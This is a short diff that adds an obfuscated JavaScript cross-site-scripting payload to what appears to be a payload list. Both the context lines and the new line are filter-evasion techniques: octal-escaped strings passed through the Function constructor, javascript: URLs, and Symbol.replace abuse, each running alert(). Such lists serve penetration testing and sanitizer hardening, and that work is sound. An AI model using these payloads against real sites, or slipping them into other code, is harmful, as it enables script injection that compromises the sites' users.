@@ -316,3 +316,4 @@ function document::onreadystatechange(){alert(1);}
 Object.defineProperties(window,{'location':{value:'javascript:alert(1)'}})
 /1/[Symbol.replace]('1',alert)
 ${''.constructor.constructor('alert(1)')()}
+var m='alert(0)';var o='';for(var i=0;i<m.length;i++) {o+='\\'+(m[i].charCodeAt().toString(8));}[]['\143\157\156\163\164\162\165\143\164\157\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\60\51')();[]['constructor']['constructor']
